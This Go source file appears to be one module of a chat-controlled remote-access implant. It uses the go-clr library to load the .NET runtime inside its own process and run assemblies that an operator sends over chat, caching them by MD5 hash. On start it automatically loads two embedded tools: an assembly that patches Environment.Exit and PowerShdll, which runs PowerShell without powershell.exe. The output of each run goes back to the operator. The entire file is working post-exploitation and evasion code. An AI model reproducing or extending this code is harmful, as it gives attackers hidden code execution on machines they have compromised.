//go:build asm

package main

import (
	"bytes"
	"crypto/md5"
	_ "embed"
	"encoding/hex"
	"sync"

	clr "github.com/Ne0nd0g/go-clr"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
	//go:embed Assemblies/patch_exit.exe
	patchExitAssembly []byte
	//go:embed Assemblies/PowerShdll.exe
	powershdllAssembly []byte
	powershdllHash     = md5.Sum(powershdllAssembly)
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [16]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime string) {
	rtHost := clrInstance.GetRuntimeHost(runtime)
	if rtHost == nil {
		SendMessage(chatID, "Could not load CLR runtime host")
		return
	}

	var methodInfo *clr.MethodInfo
	var err error

	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			SendMessage(chatID, "Could not load assembly")
			return
		}
		addAssembly(chatID, methodInfo, data)
	}

	invokeAssembly(chatID, methodInfo, assemblyArgs)
}

func executeAssemblyByHash(chatID int64, hash string, assemblyArgs []string, runtime string) {
	rtHost := clrInstance.GetRuntimeHost(runtime)
	if rtHost == nil {
		SendMessage(chatID, "Could not load CLR runtime host")
		return
	}

	asmHash, err := hex.DecodeString(hash)
	if err != nil {
		SendMessage(chatID, "Could not decode hash string")
		return
	}

	var methodInfo *clr.MethodInfo
	for _, asm := range assemblies {
		if bytes.Equal(asm.hash[:], asmHash) {
			methodInfo = asm.methodInfo
		}
	}

	if methodInfo == nil {
		SendMessage(chatID, "Could not find loaded assembly")
		return
	}

	invokeAssembly(chatID, methodInfo, assemblyArgs)
}

func executePowershell(chatID int64, assemblyArgs []string, runtime string) {
	rtHost := clrInstance.GetRuntimeHost(runtime)
	if rtHost == nil {
		SendMessage(chatID, "Could not load CLR runtime host")
		return
	}

	var methodInfo *clr.MethodInfo
	for _, asm := range assemblies {
		if asm.hash == powershdllHash {
			methodInfo = asm.methodInfo
		}
	}

	if methodInfo == nil {
		SendMessage(chatID, "Could not find PowerShdll assembly loaded")
		return
	}

	invokeAssembly(chatID, methodInfo, assemblyArgs)
}

func invokeAssembly(chatID int64, methodInfo *clr.MethodInfo, assemblyArgs []string) {
	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// For methods like Main(String[] args), if we pass an empty string slice
		// the CLR loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}
	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
	responseStr := ""
	if len(stdout) > 0 {
		responseStr += stdout
	}
	if len(stderr) > 0 {
		// Always getting this annoying message here:
		// "the MethodInfo::Invoke_3 method returned an error: ..."
		// responseStr += "Stderr:\n" + stderr
	}
	if len(responseStr) == 0 {
		responseStr = "Assembly executed successfully with no output"
	}
	SendMessage(chatID, responseStr)
}

func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()
	if c.runtimeHost == nil {
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		_ = clr.RedirectStdoutStderr()
	}
	return c.runtimeHost
}

func addAssembly(chatID int64, methodInfo *clr.MethodInfo, data []byte) {
	asmHash := md5.Sum(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
	SendMessage(chatID, "Assembly hash: "+hex.EncodeToString(asmHash[:]))
}

func getAssembly(data []byte) *assembly {
	asmHash := md5.Sum(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
	// Patch Environment.Exit
	executeAssembly(0, patchExitAssembly, []string{}, "")
	// Load PowerShdll.exe
	executeAssembly(0, powershdllAssembly, []string{"return"}, "")
}
